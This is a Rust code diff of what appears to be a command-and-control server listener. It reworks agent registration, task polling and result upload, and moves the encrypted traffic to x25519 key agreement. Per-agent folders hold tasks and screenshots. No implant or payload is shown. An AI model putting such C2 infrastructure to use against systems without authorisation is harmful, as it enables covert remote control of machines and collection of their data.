@@ -8,18 +8,22 @@ use axum::{
 use hyper::body::Incoming;
 use hyper_util::rt::TokioIo;
 use log::{error, info};
+use std::io::{Error, ErrorKind};
 use std::time::Duration;
 use std::sync::Arc;
 use tokio::sync::{broadcast, Mutex, watch};
 use tower::Service;
 use tower_http::trace::TraceLayer;
 use tower_http::timeout::TimeoutLayer;
+use x25519_dalek::{PublicKey, StaticSecret};
 
 use crate::{
     server::{
-        agents::{Agent, AgentDataEnc, AgentTask, dec_agentdataenc},
+        agents::Agent,
+        crypto::aesgcm::{cipher, decipher, decode, EncMessage, string_to_u8_32, vec_u8_to_u8_32},
         db,
-        jobs::JobMessage, crypto::aesgcm::encrypt_encode,
+        jobs::JobMessage, 
+        postdata::{CipherData, PlainData, RegisterAgentData},
     },
     utils::fs::{empty_file, mkdir, mkfile, read_file, write_file},
 };
@@ -122,157 +126,134 @@ async fn hello() -> &'static str {
 
 async fn register(
     State(db_path): State<String>,
-    Json(payload): Json<AgentDataEnc>,
+    Json(payload): Json<RegisterAgentData>,
 ) -> (StatusCode, String) {
 
     info!("Agent requested `/r`");
 
-    // Decode and decrypt AgentDataEnc
-    let ad = dec_agentdataenc(payload);
+    // Get current time for `registered` and `last_commit`.
+    let now_utc: chrono::DateTime<chrono::Utc> = chrono::Utc::now();
+    let today_utc = now_utc.date_naive();
 
-    let agent = Agent {
-        id: 0, // Temporary ID
-        name: ad.name,
-        hostname: ad.hostname,
-        os: ad.os,
-        arch: ad.arch,
-        listener_url: ad.listener_url,
-        key: ad.key.to_string(),
-        nonce: ad.nonce.to_string(),
-        task: AgentTask::Empty,
-        task_result: None,
-    };
-
-    // Check duplicate
-    match db::exists_agent(db_path.to_owned(), agent.clone()) {
-        Ok(exists) => {
-            if exists {
-                error!("Agent already exists.");
-                // Update the agent name
-                match db::update_agent_name(db_path.to_owned(), agent.clone()) {
-                    Ok(_) => {
-                        info!("Updated the agent name.");
-                        // Create directories and folders for the agent
-                        mkdir(format!("agents/{}/task", agent.name.to_owned())).unwrap();
-                        mkdir(format!("agents/{}/screenshots", agent.name.to_owned())).unwrap();
-                        mkfile(format!("agents/{}/task/name", agent.name.to_owned())).unwrap();
-                        mkfile(format!("agents/{}/task/result", agent.name.to_owned())).unwrap();
-                    }
-                    Err(e) => {
-                        error!("Error updating agent name: {:?}", e);
-                    }
-                }
-
-                let ciphertext = encrypt_encode(
-                    "Agent already exists.".as_bytes(),
-                    ad.key.as_bytes(),
-                    ad.nonce.as_bytes(),
-                );
-                return (StatusCode::OK, ciphertext);
-            }
-        }
-        Err(e) => {
-            let ciphertext = encrypt_encode(
-                format!("Error: {}", e.to_string()).as_bytes(),
-                ad.key.as_bytes(),
-                ad.nonce.as_bytes(),
-            );
-            return (StatusCode::OK, ciphertext);
-        }
-    }
+    let agent = Agent::new(
+        0,
+        payload.name,
+        payload.hostname,
+        payload.os,
+        payload.arch,
+        payload.listener_url,
+        payload.public_key,
+        today_utc.clone(),
+        today_utc,
+    );
 
     match db::add_agent(db_path, agent.clone()) {
         Ok(_) => {
-            // Create directories and folders for the agent
             mkdir(format!("agents/{}/task", agent.name.to_owned())).unwrap();
             mkdir(format!("agents/{}/screenshots", agent.name.to_owned())).unwrap();
             mkfile(format!("agents/{}/task/name", agent.name.to_owned())).unwrap();
             mkfile(format!("agents/{}/task/result", agent.name.to_owned())).unwrap();
 
-            let ciphertext = encrypt_encode(
-                "Agent registered".as_bytes(),
-                ad.key.as_bytes(),
-                ad.nonce.as_bytes(),
-            );
-            (StatusCode::OK, ciphertext)
+            return (StatusCode::OK, "".to_string());
         },
         Err(e) => {
-            error!("{e}");
-            let ciphertext = encrypt_encode(
-                "Agent already exists.".as_bytes(),
-                ad.key.as_bytes(),
-                ad.nonce.as_bytes(),
-            );
-            (StatusCode::OK, ciphertext)
+            error!("Error adding the agent: {e}");
+            return (StatusCode::OK, "".to_string());
         }
     }
 }
 
 async fn task_ask(
     State(db_path): State<String>,
-    Json(payload): Json<AgentDataEnc>,
+    Json(payload): Json<PlainData>,
 ) -> (StatusCode, String) {
     info!("Agent requested `/t/a`");
 
-    // Decode and decrypt AgentDataEnc
-    let ad = dec_agentdataenc(payload);
+    // Get the server kaypair
+    let (my_secret, my_public) = match get_server_keypair(db_path.to_string()) {
+        Ok((secret, public)) => (secret, public),
+        Err(e) => {
+            error!("Error: {:?}", e);
+            return (StatusCode::OK, "".to_string());
+        }
+    };
 
-    let agent = db::get_agent(db_path, ad.name.to_string()).unwrap();
-    let key = agent.key;
-    let nonce = agent.nonce;
+    let agent_name = payload.p;
 
-    if let Ok(task) = read_file(format!("agents/{}/task/name", ad.name)) {
-        let ciphertext = encrypt_encode(
-            &task,
-            key.as_bytes(),
-            nonce.as_bytes()
+    let agent = db::get_agent(db_path, agent_name.to_string()).unwrap();
+    let encoded_ag_public_key = agent.public_key;
+    let decoded_ag_public_key = decode(encoded_ag_public_key.as_bytes());
+    let ag_public_key = PublicKey::from(vec_u8_to_u8_32(decoded_ag_public_key).unwrap());
+
+    if let Ok(task) = read_file(format!("agents/{}/task/name", agent_name.to_string())) {
+        let cipher_message = create_cipher_message(
+            String::from_utf8(task).unwrap(),
+            my_secret.clone(),
+            ag_public_key.clone(),
         );
-        return (StatusCode::OK, ciphertext);
+        return (StatusCode::OK, cipher_message);
     } else {
-        let ciphertext = encrypt_encode(
-            "Task not found.".as_bytes(),
-            key.as_bytes(),
-            nonce.as_bytes()
+        let cipher_message = create_cipher_message(
+            "Task not found.".to_string(),
+            my_secret.clone(),
+            ag_public_key.clone(),
         );
-        return (StatusCode::NOT_FOUND, ciphertext);
+        return (StatusCode::NOT_FOUND, cipher_message);
     }
 }
 
 async fn task_result(
     State(db_path): State<String>,
-    Json(payload): Json<AgentDataEnc>,
+    Json(payload): Json<CipherData>,
 ) -> (StatusCode, String) {
     info!("Agent requested `/t/r`");
 
-    // Decode and decrypt AgentDataEnc
-    let ad = dec_agentdataenc(payload);
+    // Get the server kaypair
+    let (my_secret, my_public) = match get_server_keypair(db_path.to_string()) {
+        Ok((secret, public)) => (secret, public),
+        Err(e) => {
+            error!("Error: {:?}", e);
+            return (StatusCode::OK, "".to_string());
+        }
+    };
 
-    let agent = db::get_agent(db_path, ad.name.to_string()).unwrap();
-    let key = agent.key;
-    let nonce = agent.nonce;
+    let agent_name = payload.p;
+    let ciphertext = payload.c;
+    let nonce = payload.n;
+
+    let agent = db::get_agent(db_path, agent_name.to_string()).unwrap();
+    let encoded_ag_public_key = agent.public_key;
+    let decoded_ag_public_key = decode(encoded_ag_public_key.as_bytes());
+    let ag_public_key = PublicKey::from(vec_u8_to_u8_32(decoded_ag_public_key).unwrap());
+
+    // Decipher the ciphertext
+    let task_result = match decipher(
+        EncMessage { ciphertext, nonce },
+        my_secret.clone(),
+        ag_public_key.clone(),
+    ) {
+        Ok(t) => t,
+        Err(e) => {
+            error!("Error decrypting the task result: {:?}", e);
+            Vec::new()
+        }
+    };
 
     if let Ok(_) = write_file(
         format!(
-            "agents/{}/task/result", ad.name),
-            &ad.task_result.unwrap_or(Vec::new()),
+            "agents/{}/task/result", agent_name.to_string()),
+            &task_result,
     ) {
         // Initialize task
-        empty_file(format!("agents/{}/task/name", ad.name)).unwrap();
+        empty_file(format!("agents/{}/task/name", agent_name.to_string())).unwrap();
 
-        let ciphertext = encrypt_encode(
-            "The task result sent.".as_bytes(),
-            key.as_bytes(),
-            nonce.as_bytes(),
-        );
+        info!("Task result was written.");
 
-        return (StatusCode::OK, ciphertext);
+        return (StatusCode::OK, "".to_string());
     } else {
-        let ciphertext = encrypt_encode(
-            "Error.".as_bytes(),
-            key.as_bytes(),
-            nonce.as_bytes(),
-        );
-        return (StatusCode::NOT_ACCEPTABLE, ciphertext);
+        error!("The task result could not be written.");
+
+        return (StatusCode::NOT_ACCEPTABLE, "".to_string());
     }
 }
 
@@ -303,4 +284,46 @@ async fn shutdown_signal(receiver: Arc<Mutex<broadcast::Receiver<JobMessage>>>) 
         // _ = terminate => {},
         _ = recv_msg => {},
     }
+}
+
+fn get_server_keypair(db_path: String) -> Result<(StaticSecret, PublicKey), Error> {
+    let (encoded_my_secret, encoded_my_public) = match db::get_keypair(db_path.to_string()) {
+        Ok((s, p)) => (s, p),
+        Err(e) => {
+            return Err(Error::new(ErrorKind::Other, format!("Error: {}", e.to_string())));
+        }
+    };
+
+    let decoded_my_secret = decode(encoded_my_secret.as_bytes());
+    let decoded_my_public = decode(encoded_my_public.as_bytes());
+
+    let my_secret = StaticSecret::from(vec_u8_to_u8_32(decoded_my_secret).unwrap());
+    let my_public = PublicKey::from(vec_u8_to_u8_32(decoded_my_public).unwrap());
+
+    Ok((my_secret, my_public))
+}
+
+fn decipher_agent_name(ciphertext: String, nonce: String, my_secret: StaticSecret, opp_public: PublicKey) -> Result<String, Error> {
+    match decipher(
+        EncMessage { ciphertext, nonce },
+        my_secret,
+        opp_public,
+    ) {
+        Ok(a) => {
+            return Ok(String::from_utf8(a).unwrap());
+        }
+        Err(e) => {
+            return Err(Error::new(ErrorKind::Other, e.to_string()));
+        }
+    };
+}
+
+fn create_cipher_message(message: String, my_secret: StaticSecret, opp_public: PublicKey) -> String {
+   let cipherdata = CipherData::new(
+        "".to_string(),
+        message.as_bytes(),
+        my_secret,
+        opp_public
+    );
+   serde_json::to_string(&cipherdata).unwrap()
 }
